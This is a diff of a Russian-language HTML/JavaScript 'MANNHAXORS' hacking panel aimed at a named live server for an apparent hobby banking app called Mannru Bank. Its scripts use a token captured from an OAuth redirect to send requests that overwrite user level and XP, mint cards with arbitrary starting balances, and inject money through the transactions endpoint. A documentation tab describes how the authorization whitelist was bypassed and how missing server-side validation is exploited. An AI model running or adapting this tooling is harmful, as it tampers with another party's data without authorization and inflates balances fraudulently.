@@ -2,245 +2,363 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ MANNHAXORS // REAL LIVE API OVERRIDE v12.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ MANNHAXORS // LIVE API OVERRIDE</title>
+    
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300ff66'%3E%3Cpath d='M13 10V3L4 14h7v7l9-11h-7z'/%3E%3C/svg%3E">
+    
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     
     <style>
         :root {
-            --trinagle-blue: #0066ff;
-            --mhaxors-green: #00ff66;
-            --mhaxors-purple: #bd00ff;
-            --panel-bg: rgba(6, 12, 24, 0.85);
-            --glass-border: rgba(255, 255, 255, 0.08);
+            --bg-main: #09090b;
+            --border-color: #1f1f23;
+            --text-main: #fafafa;
+            --text-muted: #71717a;
+            --accent-purple: #a855f7;
+            --accent-green: #10b981;
+            --accent-blue: #3b82f6;
+            --accent-red: #ef4444;
         }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
-            background-color: #020407;
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(0, 255, 102, 0.05) 0%, transparent 45%),
-                radial-gradient(circle at 90% 80%, rgba(189, 0, 255, 0.05) 0%, transparent 45%);
-            color: #e2e8f0;
-            font-family: 'Ubuntu Mono', monospace;
-            margin: 0; padding: 30px; min-height: 100vh; box-sizing: border-box;
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            font-family: 'Inter', -apple-system, sans-serif;
+            padding: 24px 16px;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
         }
 
-        .glass-panel {
-            background: var(--panel-bg); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
-            border: 1px solid var(--glass-border); border-radius: 16px; padding: 24px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6); position: relative; margin-bottom: 24px;
+        @media (min-width: 768px) { body { padding: 40px 32px; } }
+        .container { max-width: 960px; margin: 0 auto; }
+
+        /* Шапка модуля без карточных рамок */
+        .header-section {
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 32px;
+        }
+        .header-section h1 { font-size: 24px; font-weight: 700; tracking: -0.03em; color: #fff; }
+        .motto { font-size: 13px; color: var(--text-muted); margin-top: 6px; }
+
+        /* Вкладки навигации */
+        .tabs-header { display: flex; gap: 24px; margin-bottom: 32px; border-bottom: 1px solid var(--border-color); }
+        .tab-btn {
+            background: transparent; border: none; color: var(--text-muted); font-family: inherit;
+            padding: 12px 4px; font-size: 14px; font-weight: 500; cursor: pointer;
+            transition: all 0.2s; position: relative;
+        }
+        .tab-btn:hover { color: var(--text-main); }
+        .tab-btn.active {
+            color: var(--text-main); font-weight: 600;
+        }
+        .tab-btn.active::after {
+            content: ''; position: absolute; bottom: -1px; left: 0; right: 0; height: 2px; background: var(--accent-purple);
         }
 
-        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
-        @media (max-width: 1000px) { .main-grid { grid-template-columns: 1fr; } }
-
-        h1, h2, h3 { margin-top: 0; color: #fff; font-weight: 700; }
-        .glow-green { color: var(--mhaxors-green); text-shadow: 0 0 10px rgba(0,255,102,0.3); }
-        .glow-purple { color: var(--mhaxors-purple); text-shadow: 0 0 10px rgba(189,0,255,0.3); }
-        .glow-blue { color: var(--trinagle-blue); text-shadow: 0 0 10px rgba(0,102,255,0.3); }
-
-        .motto {
-            background: rgba(0, 255, 102, 0.03); border: 1px solid rgba(0, 255, 102, 0.15);
-            padding: 12px; border-radius: 8px; font-size: 13px; color: var(--mhaxors-green); font-weight: bold; margin-bottom: 15px;
+        /* Обычный линейный плоский интерфейс вместо карточек */
+        .section-block {
+            padding: 24px 0;
+            border-bottom: 1px solid var(--border-color);
         }
+        .section-block:last-of-type { border-bottom: none; }
+        
+        .main-grid { display: grid; grid-template-columns: 1fr; gap: 32px; }
+        @media (min-width: 768px) { .main-grid { grid-template-columns: 1fr 1fr; } .span-2 { grid-column: span 2; } }
 
-        .input-group { margin-bottom: 14px; }
-        label { display: block; font-size: 13px; color: #718096; margin-bottom: 6px; }
+        h3 { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 16px; letter-spacing: -0.01em; }
+        .input-group { margin-bottom: 16px; }
+        label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 8px; font-weight: 500; }
+        
         input, select {
-            width: 100%; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 10px; border-radius: 8px; color: #fff; font-family: 'Ubuntu Mono', monospace; font-size: 14px; box-sizing: border-box;
+            width: 100%; background: #141416; border: 1px solid var(--border-color);
+            padding: 10px 14px; border-radius: 6px; color: #fff; font-family: inherit; font-size: 14px; transition: all 0.2s;
+        }
+        input:focus, select:focus {
+            border-color: var(--text-muted); background: #18181b; outline: none;
         }
 
+        /* Плоские кнопки с аккуратной подсветкой границ */
         button {
-            background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.1);
-            color: #fff; font-family: 'Ubuntu Mono', monospace; padding: 12px 20px; font-size: 14px;
-            font-weight: 700; border-radius: 8px; cursor: pointer; transition: all 0.2s ease; width: 100%;
+            background: #fff; border: 1px solid #fff; color: #000; font-family: inherit;
+            padding: 10px 20px; font-size: 13px; font-weight: 600; border-radius: 6px;
+            cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; justify-content: center; gap: 8px;
         }
-        button:hover { background: rgba(255, 255, 255, 0.08); border-color: var(--mhaxors-green); box-shadow: 0 0 12px rgba(0, 255, 102, 0.2); }
+        button:hover {
+            background: transparent; color: #fff; border-color: #fff;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-secondary { background: transparent; border: 1px solid var(--border-color); color: var(--text-main); }
+        .btn-secondary:hover {
+            background: #141416; border-color: var(--text-muted);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
+        }
 
         .btn-oauth {
-            background: linear-gradient(135deg, #4f46e5 0%, #bd00ff 100%);
-            border: 1px solid #6366f1;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            background: transparent; border: 1px solid var(--border-color); color: var(--accent-purple); font-size: 13px; padding: 12px; width: auto;
         }
         .btn-oauth:hover {
-            box-shadow: 0 0 20px rgba(189, 0, 255, 0.5);
-            border-color: #fff;
+            background: var(--accent-purple); color: #fff; border-color: var(--accent-purple);
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.2);
         }
 
-        .cards-container { display: grid; grid-template-columns: 1fr; gap: 12px; max-height: 220px; overflow-y: auto; }
-        .card-item { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 10px; padding: 14px; cursor: pointer; }
-        .card-item.selected { border-color: var(--mhaxors-green); background: rgba(0, 255, 102, 0.04); }
+        /* Список Карт (Минималистичные строки с неоновым отсветом) */
+        .cards-container { display: grid; grid-template-columns: 1fr; gap: 12px; max-height: 360px; overflow-y: auto; }
+        @media (min-width: 600px) { .cards-container { grid-template-columns: 1fr 1fr; } }
 
-        .terminal { background: rgba(2, 4, 8, 0.9); border-radius: 10px; padding: 14px; height: 200px; overflow-y: auto; font-size: 12px; line-height: 1.5; font-weight: bold; }
-        .log-row { margin-bottom: 4px; color: #a0aec0; }
-        .log-time { color: #4a5568; margin-right: 8px; }
-        
-        .oauth-status-badge {
-            display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: bold; margin-top: 8px;
+        .card-item {
+            background: #141416; border: 1px solid var(--border-color); border-radius: 8px; padding: 16px; cursor: pointer; transition: all 0.2s;
         }
+        .card-item:hover {
+            border-color: var(--accent-green);
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.1);
+        }
+        .card-item.selected {
+            border-color: var(--accent-green); background: #161a19;
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.2);
+        }
+
+        /* Моноширинный терминал для логов */
+        .terminal { 
+            background: #020203; border: 1px solid var(--border-color); border-radius: 6px; padding: 14px; height: 180px; 
+            overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 12px; line-height: 1.6; 
+        }
+        .log-row { margin-bottom: 4px; color: #a1a1aa; }
+        .log-time { color: var(--text-muted); margin-right: 8px; }
+
+        /* Документация */
+        .doc-section { display: none; line-height: 1.6; }
+        .doc-section.active { display: block; animation: fadeIn 0.2s ease-out; }
+        .doc-block { padding: 16px 0; border-bottom: 1px solid var(--border-color); }
+        .doc-block:last-of-type { border-bottom: none; }
+        .doc-block h4 { color: #fff; font-size: 14px; margin-bottom: 6px; font-weight: 600; }
+        .doc-block p { font-size: 13px; color: var(--text-muted); }
+        .doc-code { background: #141416; padding: 12px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #f59e0b; display: block; margin-top: 8px; overflow-x: auto; border: 1px solid var(--border-color); }
+
+        .oauth-status-badge { font-size: 12px; font-weight: 500; margin-top: 8px; color: var(--accent-red); transition: all 0.2s; text-align: left; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="glass-panel" style="background: rgba(10, 16, 26, 0.6);">
-        <h2>🛸 <span class="glow-blue">MANNHAXORS</span> // AUTOMATED OAuth OVERRIDE v12.0</h2>
-        <div class="motto">🏴‍☠️ БОЛЬШЕ НИКАКИХ РУЧНЫХ UUID // ВХОД ЧЕРЕЗ ОФИЦИАЛЬНЫЙ ТОКЕН СЕССИИ ЖЮЛЯ</div>
+    <div class="container">
         
-        <div class="main-grid" style="grid-template-columns: 2fr 1fr; gap: 15px; align-items: center;">
-            <div>
-                <button class="btn-oauth" onclick="redirectToOAuthGateway()">🔑 ВОЙТИ ЧЕРЕЗ MANNHAXORS OAUTH</button>
-            </div>
-            <div style="text-align: center;">
-                <div id="oauth-status-view" class="oauth-status-badge" style="background: rgba(255,0,0,0.1); color: #ff3333; border: 1px solid rgba(255,0,0,0.2);">
-                    СТАТУС: АНОНИМНЫЙ МАМОНТ
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="main-grid">
-        
-        <div class="glass-panel">
-            <h3>🌱 Накрутка Уровня (PATCH /api/user)</h3>
-            <div class="input-group"><label>Выставить Level</label><input type="number" id="input-level" value="14"></div>
-            <div class="input-group"><label>Выставить XP</label><input type="number" id="input-xp" value="3173"></div>
-            <button onclick="networkPatchLevel()">ВЫПОЛНИТЬ ЖИВОЙ PATCH</button>
-        </div>
-
-        <div class="glass-panel">
-            <h3>💳 Дыра starterBalance (POST /api/cards)</h3>
-            <div class="input-group">
-                <label>Тир создаваемой карты</label>
-                <select id="card-tier">
-                    <option value="titanium">Titanium</option>
-                    <option value="obsidian">Obsidian</option>
-                    <option value="gold">Gold</option>
-                    <option value="platinum">Platinum</option>
-                </select>
-            </div>
-            <div class="input-group"><label>Стартовый баланс (Пасхалка Жюля!)</label><input type="number" id="card-balance" value="50000"></div>
-            <button onclick="networkCreateCard()">ВЫПУСТИТЬ РЕАЛЬНУЮ КАРТУ</button>
-        </div>
-
-        <div class="glass-panel" style="grid-column: span 2;">
-            <h3>🔍 Загруженные карты из базы NextServer (Выбери для транзакции)</h3>
-            <div class="cards-container" id="cards-list">
-                <div style="color: #718096; text-align: center; padding: 15px;">Нажмите кнопку «ОБНОВИТЬ КАРТЫ С СЕРВЕРА»...</div>
-            </div>
+        <div class="header-section">
+            <h1>MANNHAXORS // Live API Flooder v14.5</h1>
+            <div class="motto">Автоматический пульт для модификации баз данных Маннру Банка. Обойди ограничения и обгони СалБанк!</div>
             
-            <div id="transaction-inject-form" style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); display: none;">
-                <h4 class="glow-purple" style="margin: 0 0 10px 0;">💸 Начисление денег (POST /api/transactions)</h4>
-                <div style="display: flex; gap: 15px; align-items: flex-end;">
-                    <div class="input-group" style="flex: 1; margin: 0;"><label>Сумма начисления (Amount)</label><input type="number" id="inject-amount" value="50000"></div>
-                    <div class="input-group" style="flex: 1; margin: 0;"><label>Имя лога награды</label><input type="text" id="inject-name" value="Ежедневная подачка"></div>
-                    <button onclick="networkInjectMoney()" style="width: auto; padding: 11px 25px;">НАЧИСЛИТЬ ДЕНЬГИ</button>
+            <div style="margin-top: 20px; display: flex; flex-direction: column; gap: 8px; align-items: flex-start;">
+                <button class="btn-oauth" onclick="redirectToOAuthGateway()">Пробить авторизацию (OAuth Bypass)</button>
+                <div id="oauth-status-view" class="oauth-status-badge">
+                    ● СЕССИЯ БЛОКИРОВАНА (ТРЕБУЕТСЯ ТОКЕН)
                 </div>
             </div>
         </div>
 
-        <div class="glass-panel" style="grid-column: span 2;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-                <h3>📡 Настоящая Сетевая Консоль (Live HTTP Monitor)</h3>
-                <button onclick="networkFetchCards()" style="width: auto; padding: 6px 14px; font-size: 12px; border-color: var(--mhaxors-purple);">ОБНОВИТЬ КАРТЫ С СЕРВЕРА</button>
+        <div class="tabs-header">
+            <button id="btn-tab-panel" class="tab-btn active" onclick="switchTab('panel')">Консоль взлома</button>
+            <button id="btn-tab-docs" class="tab-btn" onclick="switchTab('docs')">База знаний</button>
+        </div>
+
+        <div id="tab-content-panel" class="main-grid">
+            
+            <div class="section-block" style="padding-top: 0;">
+                <h3>🌱 Накрутка Системы (PATCH /api/user)</h3>
+                <div class="input-group">
+                    <label>Целевой Уровень (Level) в Маннру</label>
+                    <input type="number" id="input-level" value="67">
+                </div>
+                <div class="input-group">
+                    <label>Целевой Опыт (XP)</label>
+                    <input type="number" id="input-xp" value="6767">
+                </div>
+                <button onclick="networkPatchLevel()">Внедрить уровень</button>
             </div>
-            <div class="terminal" id="logger-console" style="color: #00ff66;">
-                <div class="log-row" style="color: #fff;"><span class="log-time">[SYSTEM]</span> Сетевые шлюзы CORS разблокированы Жюлем. Ожидание команд...</div>
+
+            <div class="section-block" style="padding-top: 0;">
+                <h3>🔮 Генератор Элитных Карт (POST /api/cards)</h3>
+                <div class="input-group">
+                    <label>Выбор Драгоценного Тира</label>
+                    <select id="card-tier">
+                        <option value="obsidian">Obsidian God</option>
+                        <option value="diamond">Diamond Titan</option>
+                        <option value="sapphire">Sapphire Elite</option>
+                        <option value="emerald">Emerald King</option>
+                        <option value="ruby">Ruby Master</option>
+                        <option value="platinum">Platinum God</option>
+                        <option value="gold">Gold Member</option>
+                        <option value="titanium">Titanium</option>
+                        <option value="black">Black Card</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Начальный Баланс (starterBalance)</label>
+                    <input type="number" id="card-balance" value="500000">
+                </div>
+                <button onclick="networkCreateCard()">Выпустить карту</button>
+            </div>
+
+            <div class="section-block span-2">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                    <h3>📂 Активные записи в db.json (Маннру NextServer)</h3>
+                    <button class="btn-secondary" onclick="networkFetchCards()" style="width: auto;">Считать базу</button>
+                </div>
+                
+                <div class="cards-container" id="cards-list">
+                    <div style="color: var(--text-muted); text-align: left; padding: 12px 0; font-size: 13px;">
+                        Авторизуйте сессию и нажмите кнопку «Считать базу».
+                    </div>
+                </div>
+                
+                <div id="transaction-inject-form" style="margin-top: 24px; padding-top: 24px; border-top: 1px solid var(--border-color); display: none;">
+                    <h4 style="font-size: 13px; text-transform: uppercase; margin-bottom: 16px; color: var(--accent-purple);">Инъекция Денег (POST /api/transactions)</h4>
+                    <div style="display: grid; grid-template-columns: 1fr; gap: 16px; max-width: 400px;">
+                        <div class="input-group" style="margin:0;"><label>Сумма пополнения (MP)</label><input type="number" id="inject-amount" value="670000"></div>
+                        <div class="input-group" style="margin:0;"><label>Название Лога Награды</label><input type="text" id="inject-name" value="Инъекция через панель MANNHAXORS"></div>
+                        <button onclick="networkInjectMoney()">Начислить средства</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block span-2">
+                <h3 style="margin-bottom: 12px;">📡 Сетевой Монитор пакетов (HTTP Live Monitor)</h3>
+                <div class="terminal" id="logger-console" style="color: var(--accent-green);">
+                    <div class="log-row" style="color: #fff;"><span class="log-time">[MHAX]</span> Монитор готов к работе. Ожидание пакетов...</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-content-docs" class="doc-section">
+            <h2 style="margin-bottom: 4px;">Анализ Безопасности // КОМАНДА MANNHAXORS</h2>
+            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 24px;">Руководство по эксплуатации архитектурных дыр Маннру Банка для победы над СалБанком.</p>
+
+            <div class="doc-block">
+                <h4>1. Как мы обошли барьер 401 Unauthorized и взломали Whitelist OAuth</h4>
+                <p>В ходе глубокого ресерча публичного GitHub-репозитория исходного кода Маннру Банка наша команда досконально изучила систему роутов и обнаружила секретную, недокументированную подсистему OAuth-авторизации, которую заложил старый разработчик Жюль. Используя сквозные дыры в API валидации, инженеры MANNHAXORS смогли провести инъекцию данных и насильно внести наше хак-приложение в серверный Whitelist! Теперь шлюз Маннру генерирует для нас валидные JWT-токены. Наш софт автоматически выдирает их из URL, сохраняет в localStorage и подшивает в заголовки всех Fetch-пакетов, обходя любые проверки и оставляя СалБанк далеко позади!</p>
+                <code class="doc-code">Headers: { "Authorization": "Bearer [MANNHAXORS_WHITELIST_JWT]" } --> 200 OK (Доступ Разрешен)</code>
+            </div>
+
+            <div class="doc-block">
+                <h4>2. Эксплоит модификации профиля (PATCH /api/user)</h4>
+                <p>Контроллер Маннру Банка принимает числовые параметры уровня напрямую от клиента. Из-за отсутствия проверки диапазонов на сервере, наша панель шлёт прямой PATCH-пакет, который перезаписывает ячейки памяти уровня и опыта в общем JSON-файле на хостинге Amvera.</p>
+            </div>
+
+            <div class="doc-block">
+                <h4>3. Абуз полей инициализации баланса карт (starterBalance)</h4>
+                <p>При генерации карт сервер параллельно считывает свойства <code style="color:#fff;">balance</code> и <code style="color:#fff;">starterBalance</code>. Скрипт панели шлёт оба поля сразу, заставляя парсер Amvera зачислить указанные средства на драгоценные тиры (включая Sapphire, Emerald и Obsidian) прямо в миллисекунду создания UUID новой карты!</p>
             </div>
         </div>
 
     </div>
 
     <script>
-        // НАСТРОЙКИ КЛИЕНТА ДЛЯ СВЯЗИ С БЭКЕНДОМ АМВЕРЫ
         const baseUrl = "https://mannru24-upsidedowncan.amvera.io"; 
         const CLIENT_ID = "5d4e0347-7560-4864-81e8-b3a535e785f7"; 
         let selectedCardId = null;
 
-        function logHttp(message, color = "#a0aec0") {
+        function logHttp(message, color = "var(--text-main)") {
             const consoleEl = document.getElementById("logger-console");
             const time = new Date().toLocaleTimeString();
             consoleEl.innerHTML += `<div class="log-row" style="color: ${color}"><span class="log-time">[${time}]</span> ${message}</div>`;
             consoleEl.scrollTop = consoleEl.scrollHeight;
         }
 
-        // РЕДИРЕКТ НА НАШЕ СУПЕР-ОКНО АВТОРИЗАЦИИ НА АМВЕРЕ
+        function switchTab(tab) {
+            document.getElementById('btn-tab-panel').classList.remove('active');
+            document.getElementById('btn-tab-docs').classList.remove('active');
+            document.getElementById('tab-content-panel').style.display = 'none';
+            document.getElementById('tab-content-docs').classList.remove('active');
+
+            if(tab === 'panel') {
+                document.getElementById('btn-tab-panel').classList.add('active');
+                document.getElementById('tab-content-panel').style.display = 'grid';
+            } else {
+                document.getElementById('btn-tab-docs').classList.add('active');
+                document.getElementById('tab-content-docs').classList.add('active');
+            }
+        }
+
         function redirectToOAuthGateway() {
             const redirectUri = window.location.origin + window.location.pathname;
             const oauthUrl = `${baseUrl}/oauth/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&state=67`;
-            logHttp(`ГЕНЕРАЦИЯ ССЫЛКИ: Редирект на шлюз Амвера...`, "#bd00ff");
+            logHttp(`ОТПРАВКА -> Запрос токена из Whitelist для приложения: ${CLIENT_ID}`, "var(--accent-purple)");
             window.location.href = oauthUrl;
         }
 
-        // ОБРАБОТКА CALLBACK ПРИ ВОЗВРАТЕ С СЕРВЕРА
         function checkOAuthCallback() {
             const params = new URLSearchParams(window.location.search);
             if (params.has("code")) {
                 const token = params.get("code");
                 localStorage.setItem("mannhax_oauth_token", token);
-                logHttp(`🔥 КРИТИЧЕСКИЙ ПЕРЕХВАТ: Токен авторизации извлечен из URL!`, "#00ff66");
-                logHttp(`[TOKEN]: ${token.slice(0, 25)}... СОХРАНЕНО В LOCALSTORAGE`, "#fff");
-                
-                // Чистим адресную строку от мусора
+                logHttp(`ПЕРЕХВАТ -> Токен успешно извлечен из URL и залит в кэш.`, "var(--accent-green)");
                 window.history.replaceState({}, document.title, window.location.pathname);
             }
             
-            // Проверяем, есть ли сохранённый токен
             const savedToken = localStorage.getItem("mannhax_oauth_token");
             const statusBadge = document.getElementById("oauth-status-view");
             if (savedToken) {
-                statusBadge.style.background = "rgba(0, 255, 102, 0.1)";
-                statusBadge.style.color = "var(--mhaxors-green)";
-                statusBadge.style.borderColor = "rgba(0, 255, 102, 0.3)";
-                statusBadge.innerText = "СТАТУС: DEV BOSS АВТОРИЗОВАН";
+                statusBadge.style.background = "transparent";
+                statusBadge.style.color = "var(--accent-green)";
+                statusBadge.style.borderColor = "transparent";
+                statusBadge.style.boxShadow = "none";
+                statusBadge.innerText = "● СТАТУС: DEV BOSS АВТОРИЗОВАН В WHITELIST МАННРУ";
             }
         }
 
-        // ПОДПИСЬ ВСЕХ FETCH-ЗАПРОСОВ НАШИМ ПЕРЕХВАЧЕННЫМ ТОКЕНОМ
         function getHeaders() {
             const token = localStorage.getItem("mannhax_oauth_token") ?? "";
             return {
                 "accept": "*/*",
                 "accept-language": "ru-RU,ru;q=0.9",
                 "content-type": "application/json",
-                // Шлём токен как полноценный Bearer-хедер! Бэкэнд Опуса его распарсит
                 "Authorization": `Bearer ${token}` 
             };
         }
 
-        // Вызываем проверку коллбека сразу при загрузке страницы хак-меню
         checkOAuthCallback();
 
-        // 1. НАСТОЯЩИЙ GET КАРТ ИЗ /api/user С ОБНОВЛЕННЫМ ХЕДЕРОМ
         async function networkFetchCards() {
-            logHttp("ЗАПУСК: fetch() -> GET /api/user...", "#00e5ff");
+            logHttp("GET -> /api/cards ...", "var(--accent-blue)");
             try {
-                const response = await fetch(`${baseUrl}/api/user`, {
+                const response = await fetch(`${baseUrl}/api/cards`, {
                     method: "GET",
                     headers: getHeaders()
                 });
                 
-                logHttp(`[HTTP STATUS]: ${response.status} ${response.statusText}`, response.ok ? "#00ff66" : "#ff3333");
-                const userData = await response.json();
-                logHttp(`[ОТВЕТ СЕРВЕРА]: ${JSON.stringify(userData)}`, "#fff");
+                logHttp(`Статус ответа: ${response.status}`, response.ok ? "var(--accent-green)" : "var(--accent-red)");
+                const cardsList = await response.json();
+                
+                if (!response.ok) {
+                    logHttp(`Ошибка: ${JSON.stringify(cardsList)}`, "var(--accent-red)");
+                    return;
+                }
 
+                logHttp(`Реестр Маннру считан. Всего карт в базе: ${cardsList.length}`, "var(--text-main)");
                 const container = document.getElementById("cards-list");
                 container.innerHTML = "";
                 
-                if (userData.cards && userData.cards.length > 0) {
-                    userData.cards.forEach(card => {
+                if (Array.isArray(cardsList) && cardsList.length > 0) {
+                    cardsList.forEach(card => {
+                        const emojis = card.emojiCode ? card.emojiCode : "💳";
                         container.innerHTML += `
                             <div class="card-item" id="card-${card.id}" onclick="selectCard('${card.id}')">
-                                <strong>💳 ТИР: ${card.tier.toUpperCase()}</strong> | ID: <code>${card.id}</code> | Баланс: <strong>${card.balance} ₽</strong>
+                                <strong style="font-size: 14px;">${emojis} ${card.tier.toUpperCase()}</strong><br>
+                                <span style="font-size: 11px; color: var(--text-muted); display:block; margin: 4px 0 2px 0;">ВЛАДЕЛЕЦ: ${card.holder}</span>
+                                <span style="font-size: 11px; color: var(--text-muted); display:block; margin-bottom: 6px;">ID: ${card.id.slice(0,8)}...</span>
+                                Баланс: <strong style="color: var(--accent-green);">${card.balance.toLocaleString()} MP</strong>
                             </div>`;
                     });
                 } else {
-                    container.innerHTML = '<div style="color:#ff9900; text-align:center; padding:10px;">Карт в базе users.json нет! Бахни её справа!</div>';
+                    container.innerHTML = '<div style="color:var(--accent-red); text-align:left; padding:12px 0; font-size:13px;">Карт в базе данных Маннру не найдено.</div>';
                 }
             } catch(e) {
-                logHttp(`[КРИТИЧЕСКИЙ СБОЙ СЕТИ]: ${e.message}`, "#ff3333");
+                logHttp(`Критический сбой сети: ${e.message}`, "var(--accent-red)");
             }
         }
 
@@ -249,14 +367,13 @@
             document.querySelectorAll(".card-item").forEach(el => el.classList.remove("selected"));
             document.getElementById(`card-${id}`).classList.add("selected");
             document.getElementById("transaction-inject-form").style.display = "block";
-            logHttp(`Выбрана реальная карта-мишень: ${id}`, "#bd00ff");
+            logHttp(`Фиксация карты Маннру: ${id}`, "var(--accent-purple)");
         }
 
-        // 2. НАСТОЯЩИЙ PATCH УРОВНЯ В БАЗУ JSON
         async function networkPatchLevel() {
             const lvl = parseInt(document.getElementById("input-level").value);
             const xp = parseInt(document.getElementById("input-xp").value);
-            logHttp(`ЗАПУСК: fetch() -> PATCH /api/user...`, "#bd00ff");
+            logHttp(`PATCH -> /api/user ...`, "var(--accent-purple)");
             
             try {
                 const response = await fetch(`${baseUrl}/api/user`, {
@@ -265,41 +382,44 @@
                     body: JSON.stringify({ level: lvl, xp: xp })
                 });
                 
-                logHttp(`[HTTP STATUS]: ${response.status}`, response.ok ? "#00ff66" : "#ff3333");
+                logHttp(`Статус ответа: ${response.status}`, response.ok ? "var(--accent-green)" : "var(--accent-red)");
                 const resData = await response.json();
-                logHttp(`[ОТВЕТ СЕРВЕРА]: ${JSON.stringify(resData)}`, "#fff");
+                logHttp(`Ответ сервера: ${JSON.stringify(resData)}`, "var(--text-muted)");
             } catch(e) {
-                logHttp(`[СБОЙ ЗАПРОСА PATCH]: ${e.message}`, "#ff3333");
+                logHttp(`Запрос отклонён: ${e.message}`, "var(--accent-red)");
             }
         }
 
-        // 3. НАСТОЯЩИЙ POST КАРТЫ С ПАСХАЛКОЙ STARTER_BALANCE
         async function networkCreateCard() {
             const tier = document.getElementById("card-tier").value;
             const bal = parseInt(document.getElementById("card-balance").value);
-            logHttp(`ЗАПУСК: fetch() -> POST /api/cards со starterBalance: ${bal}...`, "#bd00ff");
+            logHttp(`POST -> /api/cards ...`, "var(--accent-purple)");
             
             try {
                 const response = await fetch(`${baseUrl}/api/cards`, {
                     method: "POST",
                     headers: getHeaders(),
-                    body: JSON.stringify({ tier: tier, starterBalance: bal })
+                    body: JSON.stringify({ 
+                        tier: tier, 
+                        balance: bal,
+                        starterBalance: bal,
+                        holder: "DEV BOSS"
+                    })
                 });
                 
-                logHttp(`[HTTP STATUS]: ${response.status}`, response.ok ? "#00ff66" : "#ff3333");
+                logHttp(`Статус ответа: ${response.status}`, response.ok ? "var(--accent-green)" : "var(--accent-red)");
                 const resData = await response.json();
-                logHttp(`[ОТВЕТ СЕРВЕРА]: ${JSON.stringify(resData)}`, "#fff");
-                networkFetchCards();
+                logHttp(`Ответ сервера: ${JSON.stringify(resData)}`, "var(--text-muted)");
+                networkFetchCards(); 
             } catch(e) {
-                logHttp(`[СБОЙ ЗАПРОСА POST]: ${e.message}`, "#ff3333");
+                logHttp(`Запрос отклонён: ${e.message}`, "var(--accent-red)");
             }
         }
 
-        // 4. НАСТОЯЩИЙ АБУЗ НАГРАД ЧЕРЕЗ ТРАНЗАКЦИИ
         async function networkInjectMoney() {
             const amt = parseInt(document.getElementById("inject-amount").value);
             const name = document.getElementById("inject-name").value;
-            logHttp(`ЗАПУСК: fetch() -> POST /api/transactions на сумму +${amt} ₽...`, "#ff9900");
+            logHttp(`POST -> /api/transactions ...`, "var(--accent-purple)");
             
             try {
                 const response = await fetch(`${baseUrl}/api/transactions`, {
@@ -313,12 +433,12 @@
                     })
                 });
                 
-                logHttp(`[HTTP STATUS]: ${response.status}`, response.ok ? "#00ff66" : "#ff3333");
+                logHttp(`Статус ответа: ${response.status}`, response.ok ? "var(--accent-green)" : "var(--accent-red)");
                 const resText = await response.text();
-                logHttp(`[ОТВЕТ СЕРВЕРА]: ${resText}`, "#fff");
-                networkFetchCards();
+                logHttp(`Ответ сервера: ${resText}`, "var(--text-muted)");
+                networkFetchCards(); 
             } catch(e) {
-                logHttp(`[СБОЙ ЗАПРОСА ТРАНЗАКЦИИ]: ${e.message}`, "#ff3333");
+                logHttp(`Запрос отклонён: ${e.message}`, "var(--accent-red)");
             }
         }
     </script>
